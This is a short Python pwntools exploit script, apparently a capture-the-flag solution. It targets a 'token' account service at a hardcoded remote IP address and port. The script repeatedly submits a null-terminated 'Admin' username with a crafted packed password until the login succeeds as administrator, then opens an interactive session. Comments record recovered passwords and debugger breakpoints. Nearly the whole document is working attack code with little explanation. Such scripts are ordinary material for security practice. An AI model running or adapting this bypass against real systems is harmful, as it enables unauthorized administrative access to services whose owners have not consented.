from pwn import *
#p=process('./token')
p=remote('103.229.41.18',8081)
#raw_input("DEBUG")

def create(user,passwd):
	p.sendlineafter("choice:","1")
	p.sendafter("account:",str(user))
	p.sendafter("password:",str(passwd))
	log.info("Create")
	#39

def login(user,passwd,index):
	p.sendlineafter("choice:","2")
	p.sendlineafter("account:",str(user))
	p.sendlineafter("password:",str(passwd))
	p.sendline(str(index))
	a = p.recvuntil("\n")
	if "Admin" in a:
		print "Bingo"
		return
	print a
#admin pass: 39, user pass: 29

def delete(index):
	p.sendlineafter("choice:","4")
	p.sendline(str(index))
	log.info("Delete "+str(index))


#create("a","b"*8)
while(1):
	#login("Admin\x00",p64(0x5700060504030201),77)
	p.sendlineafter("choice:","2")
	p.sendlineafter("account:","Admin\x00")
	p.sendlineafter("password:",p64(0x5700060504030201))
	p.sendline(str(22))
	a = p.recvuntil("\n")
	if "Admin" in a:
		print "Bingo"
		break
	print a
#print p.recvuntil("\n")



p.interactive()

'''

b*0x400f72 
b*0x4011b5 
b*0x401256 
'''